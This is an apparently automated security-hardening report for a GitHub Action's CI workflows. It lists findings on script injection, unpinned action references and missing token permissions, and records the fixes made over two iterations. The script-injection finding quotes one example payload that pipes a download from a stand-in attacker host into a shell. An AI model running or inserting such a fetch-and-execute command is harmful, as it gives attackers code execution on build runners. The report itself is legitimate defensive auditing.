<!-- markdownlint-disable -->

# Hardening Report: shimataro--ssh-key-action/v2.8.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **shimataro--ssh-key-action/v2.8.0** was hardened automatically. 3 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (a) violation: `${{ inputs.package_installation_command }}` is interpolated directly as the entire `run:` shell command in 12 separate steps across all jobs in reusable-verify.yml. Any workflow that calls this reusable workflow can supply an arbitrary shell command string (e.g. `package_installation_command: 'curl https://evil.example | sh'`), achieving full remote code execution on the runner. The offending pattern is `run: ${{ inputs.package_installation_command }}`.

Locations:

- `.github/workflows/reusable-verify.yml:37`
- `.github/workflows/reusable-verify.yml:57`
- `.github/workflows/reusable-verify.yml:95`
- `.github/workflows/reusable-verify.yml:115`
- `.github/workflows/reusable-verify.yml:153`
- `.github/workflows/reusable-verify.yml:173`
- `.github/workflows/reusable-verify.yml:213`
- `.github/workflows/reusable-verify.yml:237`
- `.github/workflows/reusable-verify.yml:257`
- `.github/workflows/reusable-verify.yml:281`
- `.github/workflows/reusable-verify.yml:301`
- `.github/workflows/reusable-verify.yml:325`

### unpinned-uses (severity: high)

Multiple `uses:` references are pinned to mutable version tags rather than immutable 40-character commit SHAs, making the workflows vulnerable to supply-chain attacks if the upstream action tag is moved or compromised. Failing references: `actions/checkout@v6` (build.yml line 27, reusable-verify.yml ×12) and `actions/setup-node@v6` (build.yml line 29).

Locations:

- `.github/workflows/build.yml:27`
- `.github/workflows/build.yml:29`
- `.github/workflows/reusable-verify.yml:40`
- `.github/workflows/reusable-verify.yml:60`
- `.github/workflows/reusable-verify.yml:98`
- `.github/workflows/reusable-verify.yml:118`
- `.github/workflows/reusable-verify.yml:156`
- `.github/workflows/reusable-verify.yml:176`
- `.github/workflows/reusable-verify.yml:216`
- `.github/workflows/reusable-verify.yml:240`
- `.github/workflows/reusable-verify.yml:260`
- `.github/workflows/reusable-verify.yml:284`
- `.github/workflows/reusable-verify.yml:304`
- `.github/workflows/reusable-verify.yml:328`

### missing-permissions (severity: medium)

None of the workflow files define a top-level `permissions:` block, and no individual job defines its own `permissions:` block. Without explicit permissions, GitHub Actions defaults to the repository's default token permissions (often `write` for all scopes on older repositories), granting jobs more access than necessary. All 8 workflow files are affected: build.yml, reusable-verify.yml, verify-on-ubuntu.yml, verify-on-macos.yml, verify-on-windows.yml, verify-on-container-alpine.yml, verify-on-container-centos.yml, verify-on-container-ubuntu.yml.

Locations:

- `.github/workflows/build.yml:1`
- `.github/workflows/reusable-verify.yml:1`
- `.github/workflows/verify-on-ubuntu.yml:1`
- `.github/workflows/verify-on-macos.yml:1`
- `.github/workflows/verify-on-windows.yml:1`
- `.github/workflows/verify-on-container-alpine.yml:1`
- `.github/workflows/verify-on-container-centos.yml:1`
- `.github/workflows/verify-on-container-ubuntu.yml:1`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, unpinned-uses, missing-permissions

**Notes:**

Fixed all three findings across 8 workflow files: (1) script-injection: replaced all 12 occurrences of `run: ${{ inputs.package_installation_command }}` in reusable-verify.yml with env-block pattern using `eval "$PACKAGE_INSTALLATION_COMMAND"` to prevent direct YAML template interpolation; (2) unpinned-uses: pinned actions/checkout@v6 to SHA d23441a48e516b6c34aea4fa41551a30e30af803 and actions/setup-node@v6 to SHA 249970729cb0ef3589644e2896645e5dc5ba9c38 across build.yml (2 refs) and reusable-verify.yml (12 refs); (3) missing-permissions: added `permissions: {}` top-level block to all 8 workflow files.

### Iteration 2

**Fixes applied:** script-injection, unpinned-uses

**Notes:**

Fixed three findings: (1) In .github/actions/cache-npm/action.yml, replaced `${{ github.env }}` with `$GITHUB_ENV` on lines 11 and 15 to eliminate direct expression interpolation in run: blocks. (2) In .github/workflows/reusable-verify.yml, replaced all 12 occurrences of `eval "$PACKAGE_INSTALLATION_COMMAND"` with a safe xargs-based tokenization pattern that builds a bash array and executes it directly, preventing shell injection via the package_installation_command input. (3) Pinned `actions/cache@v3` to `actions/cache@6f8efc29b200d32929f49075959781ed54ec270c # v3` in cache-npm/action.yml.

